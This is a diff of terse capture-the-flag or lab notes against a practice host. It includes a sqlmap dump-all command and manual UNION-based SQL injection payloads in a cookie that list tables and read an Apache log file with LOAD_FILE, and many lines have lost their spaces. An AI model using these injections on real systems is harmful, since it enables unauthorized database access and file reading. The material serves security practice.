@@ -9,7 +9,7 @@ Ports:
 Nothinginterestingfoundsearchingdirectoris,higestports.
 aftercaptureburprequest,singleparametersuspectisCookie
 
->sqlmap-uhttp://10.10.11.217/--dump-all--level5--risk3--batch
+>sqlmap -u http://10.10.11.217/ --dump-all --level 5 --risk 3 --batch
 	[02:59:05][INFO]testingconnectiontothetargetURL
 	youhavenotdeclaredcookie(s),whileserverwantstosetitsown('id=5f9d79710af...8d71d695f5').
 
@@ -36,9 +36,9 @@ Cookie:id='UNIONSELECT1,group_concat(table_name)FROMinformation_schema.tablesWHE
 Cookie:id='unionselect1,group_concat(column_name)frominformation_schema.columnswheretable_schema=database()---
 Cookie:id='unionselect1,group_concat(userID)fromqueue---
 
-nothingreallyinteresting
+nothing really interesting
 
-Trysqlinjectionreadfiles
+Try sqlinjection read files
 
 Cookie:id='unionselect1,LOAD_FILE("/var/log/apache2/access.log")---
 
